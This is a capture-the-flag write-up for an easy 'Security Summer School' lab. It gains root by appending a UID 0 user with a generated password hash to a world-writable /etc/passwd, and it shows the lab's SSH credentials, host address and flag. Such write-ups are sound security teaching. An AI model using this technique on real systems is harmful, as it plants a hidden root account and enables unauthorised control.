---
Name: "Writable"
Category: "Security Summer School"
Difficulty: "Easy"
Description: "Gaining root access by exploiting write permissions on /etc/passwd."
---

# Writable
```bash
ssh -p 2024 jack@sss.upb 
YvFWPeC7sTWJdaYQ
```

The name of the challenge suggests we can write in an important file, after inspecting the machine we find out that the file is /etc/passwd
```bash
jack@writable:~$ ls -l /etc/passwd
-rw-r--rw- 1 root root 1320 Jul 24  2022 /etc/passwd
```

Lets generate the SHA-512 hash for our password
```bash
openssl passwd -6 -salt mysalt pass
```

Add a new entry
```bash
echo 'theo:$6$mysalt$xDOF4tdccs7ch7ng0lnbKQoqVd1ht2x0P3KQzWSZafhldlI65JsFSmlAAj9La8dikYU0LNkS1.gOL.54UCqPt/:0:0:root:/root:/bin/bash' >> /etc/passwd
```

Now we can switch to that user
```bash
jack@writable:~$ su theo
Password:
root@writable:/home/ubuntu# cd /root
root@writable:~# ls
flag.txt
root@writable:~# cat flag.txt
SSS{th1s_w4s_s0_wr1t4bl3}
```

> [!NOTE]
> Had some issues with the inital connection, had to use
> 
> ssh -oKexAlgorithms=curve25519-sha256 -p 2024 jack@141.85.224.102

